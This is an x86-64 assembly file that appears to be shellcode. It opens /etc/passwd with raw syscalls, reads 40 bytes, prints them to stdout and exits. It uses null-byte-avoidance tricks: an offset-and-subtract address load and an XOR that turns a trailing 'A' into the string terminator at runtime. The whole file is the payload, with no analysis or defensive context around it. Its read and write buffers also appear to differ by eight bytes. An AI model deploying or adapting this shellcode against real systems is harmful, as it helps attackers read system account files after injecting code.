		.global _start

		.text
_start:
		# open(/etc/passwd)
		xor		%rbp, %rbp
		xor		%rdx, %rdx
		lea		path+0x4444401(%rip), %rdi
		sub		$0x4444401, %rdi
		xorb	$0x41, 0xb(%rdi) 
		xor  	%rax, %rax
		mov		$2, %al
		syscall

		# read(/etc/passwd)
		mov 	%rax, %rdi
		sub 	$40, %rsp
		lea 	0x08(%rsp), %rsi
		mov		$40,%dl
		xor 	%rax, %rax
		syscall

		# write(/etc/passwd)
		xor		%rax, %rax                  # system call 1 is write
		inc		%rax
        mov		%rax, %rdi		    		# file handle 1 is stdout              
	    mov		%rsp, %rsi
		mov		$40,%dl               	    # number of bytes
        syscall 

		
		# exit(0)
		mov		$60, %al
		xor 	%rdi, %rdi
		syscall

path:
		.ascii	"/etc/passwdA"
